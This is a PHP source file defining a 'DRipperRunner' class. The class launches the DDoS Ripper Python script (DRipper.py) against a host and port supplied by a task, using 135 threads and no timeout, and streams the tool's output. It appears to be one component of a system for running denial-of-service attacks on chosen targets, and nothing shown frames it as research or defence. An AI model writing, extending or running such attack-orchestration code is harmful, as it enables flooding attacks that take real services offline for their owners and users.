<?php

declare(strict_types=1);

namespace App\AppRunner;

use App\Struct\Task;
use Symfony\Component\Process\Process;
use function fopen;
use function fwrite;

class DRipperRunner extends AbstractRunner
{
    private Task $task;

    public function __construct(Task $task)
    {
        $this->task = $task;
        $args = ['/usr/bin/python3', '-u', '/opt/ddos-ripper/DRipper.py', '-s', $this->task->host, '-p', $this->task->port, '-t', '135'];
        $this->proc = new Process(command: $args, timeout: 0.0);
    }
    public function run(): void
    {
        $this->proc->start(function ($type, $data) {
            if ($type === Process::ERR) {
                fwrite(fopen('php://stderr', 'wb+'), $data);
            } else {
                fwrite(fopen('php://stdout', 'wb+'), $data);
            }
        });
    }
}
